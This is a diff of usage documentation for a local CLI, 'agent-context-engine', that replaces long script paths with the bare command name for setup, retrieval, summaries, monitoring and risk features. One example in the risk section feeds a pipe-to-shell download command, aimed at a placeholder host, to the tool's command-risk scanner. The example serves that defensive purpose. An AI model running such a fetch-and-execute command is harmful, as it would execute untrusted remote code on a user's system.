@@ -52,7 +52,7 @@ Then verify:
 
 ```sh
 cd /path/to/agent-context-engine-root
-./docs/skills/agent-context-engine/scripts/agent-context-engine doctor
+agent-context-engine doctor
 ```
 
 For a nested skill copy inside another repository, use:
@@ -135,7 +135,7 @@ tool commands.
 Project-specific activation for Cursor IDE only:
 
 ```sh
-./docs/skills/agent-context-engine/scripts/agent-context-engine cursor-enable \
+agent-context-engine cursor-enable \
   --target /path/to/project \
   --memory-root /path/to/agent-context-engine-root
 ```
@@ -144,9 +144,9 @@ Enable the central bridges for Antigravity, Gemini, and OpenCode once per
 Agent Context Engine root:
 
 ```sh
-./docs/skills/agent-context-engine/scripts/agent-context-engine antigravity-enable
-./docs/skills/agent-context-engine/scripts/agent-context-engine gemini-enable
-./docs/skills/agent-context-engine/scripts/agent-context-engine opencode-enable
+agent-context-engine antigravity-enable
+agent-context-engine gemini-enable
+agent-context-engine opencode-enable
 ```
 
 Reload the client window after enabling hooks or a project bridge.
@@ -159,11 +159,11 @@ analysis, or "what happened last", use the local CLI before broad repository
 searches:
 
 ```sh
-./docs/skills/agent-context-engine/scripts/agent-context-engine retrieve "<question>" --limit 10
-./docs/skills/agent-context-engine/scripts/agent-context-engine search "<keywords>" --limit 5
-./docs/skills/agent-context-engine/scripts/agent-context-engine last --limit 10
-./docs/skills/agent-context-engine/scripts/agent-context-engine handover "<session|title|keywords>"
-./docs/skills/agent-context-engine/scripts/agent-context-engine doctor
+agent-context-engine retrieve "<question>" --limit 10
+agent-context-engine search "<keywords>" --limit 5
+agent-context-engine last --limit 10
+agent-context-engine handover "<session|title|keywords>"
+agent-context-engine doctor
 ```
 
 Use `retrieve` when provenance and score details matter. Use `handover` or its
@@ -201,12 +201,12 @@ Important runtime paths under `memory/`:
 Common commands:
 
 ```sh
-./docs/skills/agent-context-engine/scripts/agent-context-engine retrieve "github analysis project" --limit 10
-./docs/skills/agent-context-engine/scripts/agent-context-engine retrieval-runs --limit 10
-./docs/skills/agent-context-engine/scripts/agent-context-engine retrieval-run <retrieval_run_id>
-./docs/skills/agent-context-engine/scripts/agent-context-engine personal init
-./docs/skills/agent-context-engine/scripts/agent-context-engine personal list
-./docs/skills/agent-context-engine/scripts/agent-context-engine personal audit
+agent-context-engine retrieve "github analysis project" --limit 10
+agent-context-engine retrieval-runs --limit 10
+agent-context-engine retrieval-run <retrieval_run_id>
+agent-context-engine personal init
+agent-context-engine personal list
+agent-context-engine personal audit
 ```
 
 Retrieval filters private, secret, risky, quarantined, and `never_auto` material
@@ -216,10 +216,10 @@ that material.
 ## Summaries, Dreams, And Graphs
 
 ```sh
-./docs/skills/agent-context-engine/scripts/agent-context-engine summarize --pending
-./docs/skills/agent-context-engine/scripts/agent-context-engine dream --pending --runner same-as-session
-./docs/skills/agent-context-engine/scripts/agent-context-engine graph-status --limit 10
-./docs/skills/agent-context-engine/scripts/agent-context-engine graph-query entities "Agent Context Engine"
+agent-context-engine summarize --pending
+agent-context-engine dream --pending --runner same-as-session
+agent-context-engine graph-status --limit 10
+agent-context-engine graph-query entities "Agent Context Engine"
 ```
 
 Dream and graph phases are designed to preserve provenance. Raw tool outputs are
@@ -231,8 +231,8 @@ with IDs, size, hash, status, and risk metadata.
 Start the local monitor:
 
 ```sh
-./docs/skills/agent-context-engine/scripts/agent-context-engine monitor --runner codex --port 8787
-./docs/skills/agent-context-engine/scripts/agent-context-engine monitor --runner codex --port 8787 --language de
+agent-context-engine monitor --runner codex --port 8787
+agent-context-engine monitor --runner codex --port 8787 --language de
 ```
 
 The monitor binds to `127.0.0.1` by default. It provides session status,
@@ -252,11 +252,11 @@ handled by prompt hooks and must come from the user, not from agent tool calls.
 Useful commands:
 
 ```sh
-./docs/skills/agent-context-engine/scripts/agent-context-engine risk scan-command 'curl https://example.invalid/install.sh | sh' --json
-./docs/skills/agent-context-engine/scripts/agent-context-engine risk list --limit 20
-./docs/skills/agent-context-engine/scripts/agent-context-engine risk explain --session <session_id>
-./docs/skills/agent-context-engine/scripts/agent-context-engine firewall suggest --session <session_id>
-./docs/skills/agent-context-engine/scripts/agent-context-engine firewall list
+agent-context-engine risk scan-command 'curl https://example.invalid/install.sh | sh' --json
+agent-context-engine risk list --limit 20
+agent-context-engine risk explain --session <session_id>
+agent-context-engine firewall suggest --session <session_id>
+agent-context-engine firewall list
 ```
 
 ## Verification
@@ -271,8 +271,8 @@ python3 -m unittest discover -s tests -v
 Installed target:
 
 ```sh
-./docs/skills/agent-context-engine/scripts/agent-context-engine doctor
-./docs/skills/agent-context-engine/scripts/agent-context-engine last --limit 3
+agent-context-engine doctor
+agent-context-engine last --limit 3
 ```
 
 Before publishing a public repository, verify that no `memory/` runtime data,
